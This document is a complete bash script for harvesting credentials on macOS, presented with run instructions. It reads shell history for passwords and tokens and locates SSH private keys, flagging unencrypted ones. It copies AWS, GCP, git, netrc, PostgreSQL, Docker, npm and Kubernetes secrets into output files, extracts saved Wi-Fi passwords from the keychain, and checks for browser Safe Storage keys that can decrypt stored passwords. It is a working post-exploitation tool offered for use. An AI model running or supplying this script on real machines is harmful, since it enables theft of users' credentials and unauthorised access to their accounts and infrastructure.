#!/bin/bash
# macOS Credential Hunting Script
# Usage: chmod +x credential_search.sh && ./credential_search.sh
# Searches common locations for credentials, tokens, and secrets

set -euo pipefail

OUTPUT_DIR="${1:-./cred_hunt_$(date +%Y%m%d_%H%M%S)}"
mkdir -p "$OUTPUT_DIR"

log() { echo "[*] $1"; }
found() { echo -e "\033[0;31m[!] $1\033[0m"; }

exec > >(tee "$OUTPUT_DIR/credential_hunt.txt") 2>&1

echo "═══════════════════════════════════════"
echo " macOS CREDENTIAL HUNT — $(date)"
echo "═══════════════════════════════════════"

# ── Shell History ──
log "Shell History"

for hist in ~/.bash_history ~/.zsh_history ~/.sh_history; do
    if [ -f "$hist" ]; then
        found "Found: $hist ($(wc -l < "$hist") lines)"
        grep -inE "password|passwd|secret|token|api[_-]?key|auth|bearer|curl.*-u|wget.*--password|mysql.*-p|ssh.*-i|scp|rsync|aws.*configure|export.*KEY|export.*SECRET|export.*TOKEN" "$hist" 2>/dev/null | head -20 | tee -a "$OUTPUT_DIR/history_secrets.txt"
    fi
done

# ── SSH Keys ──
log "SSH Keys and Config"

if [ -d ~/.ssh ]; then
    found "SSH directory exists"
    ls -la ~/.ssh/ | tee -a "$OUTPUT_DIR/ssh_files.txt"

    # Check for unprotected private keys
    for key in ~/.ssh/id_* ~/.ssh/*.pem; do
        if [ -f "$key" ] && head -1 "$key" | grep -q "PRIVATE KEY"; then
            if ! head -5 "$key" | grep -q "ENCRYPTED"; then
                found "UNENCRYPTED private key: $key"
            else
                log "Encrypted private key: $key"
            fi
        fi
    done 2>/dev/null

    # SSH config with hosts
    if [ -f ~/.ssh/config ]; then
        found "SSH config with hosts:"
        grep -E "Host |HostName |User |IdentityFile " ~/.ssh/config 2>/dev/null | tee -a "$OUTPUT_DIR/ssh_config.txt"
    fi
fi

# Authorized keys (inbound access)
if [ -f ~/.ssh/authorized_keys ]; then
    found "Authorized keys: $(wc -l < ~/.ssh/authorized_keys) entries"
fi

# ── Cloud Provider Credentials ──
log "Cloud Provider Credentials"

# AWS
for awsfile in ~/.aws/credentials ~/.aws/config; do
    if [ -f "$awsfile" ]; then
        found "AWS config: $awsfile"
        grep -E "aws_access_key_id|aws_secret_access_key|aws_session_token|region" "$awsfile" 2>/dev/null | tee -a "$OUTPUT_DIR/aws_creds.txt"
    fi
done

# GCP
if [ -f ~/.config/gcloud/application_default_credentials.json ]; then
    found "GCP Application Default Credentials found"
    cat ~/.config/gcloud/application_default_credentials.json | tee -a "$OUTPUT_DIR/gcp_creds.txt"
fi
if [ -d ~/.config/gcloud ]; then
    found "GCP config directory exists"
    ls -la ~/.config/gcloud/ | tee -a "$OUTPUT_DIR/gcp_files.txt"
fi

# Azure
if [ -f ~/.azure/accessTokens.json ]; then
    found "Azure access tokens found"
fi
if [ -f ~/.azure/azureProfile.json ]; then
    found "Azure profile found"
fi

# ── .env Files ──
log "Environment files (.env)"

find ~ -maxdepth 5 -name ".env" -o -name ".env.*" -o -name "*.env" 2>/dev/null | while read -r envfile; do
    found "Env file: $envfile"
    grep -iE "password|secret|key|token|api|database_url|redis_url|mongo" "$envfile" 2>/dev/null | head -10
done | tee -a "$OUTPUT_DIR/env_files.txt"

# ── Git Credentials ──
log "Git Credentials"

if [ -f ~/.git-credentials ]; then
    found "Git credentials file (plaintext URLs with passwords):"
    cat ~/.git-credentials | tee -a "$OUTPUT_DIR/git_creds.txt"
fi

if [ -f ~/.gitconfig ]; then
    grep -i "credential\|token\|password\|user" ~/.gitconfig 2>/dev/null | tee -a "$OUTPUT_DIR/git_config.txt"
fi

# Git credential helpers
git config --global credential.helper 2>/dev/null || true

# ── Wi-Fi Passwords ──
log "Wi-Fi Passwords (requires admin)"

networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2 | head -10 | while read -r ssid; do
    ssid=$(echo "$ssid" | xargs)
    if [ -n "$ssid" ]; then
        echo -n "  $ssid: "
        security find-generic-password -D "AirPort network password" -s "$ssid" -w 2>/dev/null || echo "(denied)"
    fi
done | tee -a "$OUTPUT_DIR/wifi_passwords.txt"

# ── Application Config Files ──
log "Application Secrets"

# Docker
if [ -f ~/.docker/config.json ]; then
    found "Docker config (may contain registry auth):"
    grep -E "auth|username|password|email" ~/.docker/config.json 2>/dev/null | tee -a "$OUTPUT_DIR/docker_creds.txt"
fi

# npm
if [ -f ~/.npmrc ]; then
    found "NPM config:"
    grep -E "token|_auth|registry|//.*:" ~/.npmrc 2>/dev/null | tee -a "$OUTPUT_DIR/npm_creds.txt"
fi

# pip
if [ -f ~/.pip/pip.conf ] || [ -f ~/.config/pip/pip.conf ]; then
    found "Pip config found"
fi

# Kubernetes
if [ -f ~/.kube/config ]; then
    found "Kubernetes config (may contain tokens/certs):"
    grep -E "token|password|certificate-authority|client-certificate|client-key" ~/.kube/config 2>/dev/null | head -10
fi

# Terraform
find ~ -maxdepth 4 -name "*.tfvars" 2>/dev/null | while read -r tf; do
    found "Terraform vars: $tf"
    grep -iE "password|secret|key|token" "$tf" 2>/dev/null | head -5
done

# CocoaPods
if [ -f ~/.netrc ]; then
    found "Netrc file (may contain credentials):"
    cat ~/.netrc | tee -a "$OUTPUT_DIR/netrc.txt"
fi

# ── Xcode / Development ──
log "Development Credentials"

# Xcode accounts
if [ -d ~/Library/Developer ]; then
    find ~/Library/Developer -name "*.plist" -exec grep -l -i "password\|token\|secret" {} \; 2>/dev/null | head -5
fi

# Provisioning profiles (contain certificates)
if [ -d ~/Library/MobileDevice/Provisioning\ Profiles ]; then
    found "iOS provisioning profiles: $(ls ~/Library/MobileDevice/Provisioning\ Profiles/ 2>/dev/null | wc -l) files"
fi

# ── Database Credentials ──
log "Database Connection Strings"

# PostgreSQL
if [ -f ~/.pgpass ]; then
    found "PostgreSQL password file:"
    cat ~/.pgpass | tee -a "$OUTPUT_DIR/pgpass.txt"
fi

# MySQL
if [ -f ~/.my.cnf ]; then
    found "MySQL config:"
    grep -iE "password|user" ~/.my.cnf 2>/dev/null | tee -a "$OUTPUT_DIR/mysql_creds.txt"
fi

# MongoDB
if [ -f ~/.dbshell ]; then
    found "MongoDB shell history"
fi

# Redis
if [ -f ~/.rediscli_history ]; then
    found "Redis CLI history (may contain AUTH commands):"
    grep -i "auth" ~/.rediscli_history 2>/dev/null
fi

# ── Browser Safe Storage Keys ──
log "Browser Safe Storage Keys (Keychain)"

for browser in "Chrome Safe Storage" "Brave Safe Storage" "Microsoft Edge Safe Storage" "Chromium Safe Storage" "Vivaldi Safe Storage"; do
    if security find-generic-password -s "$browser" 2>/dev/null | grep -q "svce"; then
        found "Found: $browser (can decrypt browser passwords)"
    fi
done

# ── Summary ──
echo ""
echo "═══════════════════════════════════════"
echo " HUNT COMPLETE"
echo "═══════════════════════════════════════"
log "Results saved to: $OUTPUT_DIR/"
log "Files found:"
ls -la "$OUTPUT_DIR/"
